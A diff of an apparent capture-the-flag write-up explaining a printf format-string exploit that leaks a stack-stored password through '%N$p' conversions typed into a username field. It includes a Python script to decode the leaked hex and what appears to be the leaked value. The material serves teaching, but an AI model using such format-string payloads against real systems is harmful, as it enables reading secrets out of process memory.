@@ -1,6 +1,38 @@
-Printf function uses user input as an argument (username), we can exploit with looking stack with %p 
+The main exploit in this level is the unprotected printf usage on line 62.
+
+We can use it to read the password contents that is read into memory.
+
+Printf's %p conversion will print 8 bytes of memory, taking a new variable from 
+the stack on every new conversion.
+
+You can also specify the exact conversion number in the form of %N$p where N is the
+number of the variable on the stack that you are targeting.
+
+Password is stored in $rbp-0xa0, a0 being 160 in decimal, and each pointer taking 8 bytes,
+we should be targeting variables 21 to 26. 
+
+So put %21$p %22$p %23$p %24$p %25$p %26$p into username!
+
+A small Python script to parse the output (it needs to be reversed due to how it's stored in memory)
 
 
-2 questions:
-why password is there where it is
-why reverse bro?
+```python3
+output = "0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d"
+
+output_without_spaces = output.replace(" ", "")
+
+hex_blocks = output.split("0x")[1:]
+
+def parse_block(block):
+    i = len(block) - 1
+    while i >= 0:
+        substr = block[i-1:i+1]
+        print(chr(int(substr, 16)), end="")
+        i -= 2
+
+for block in hex_blocks:
+    parse_block(block.strip(' '))
+
+# A newline for style
+print()
+```python3
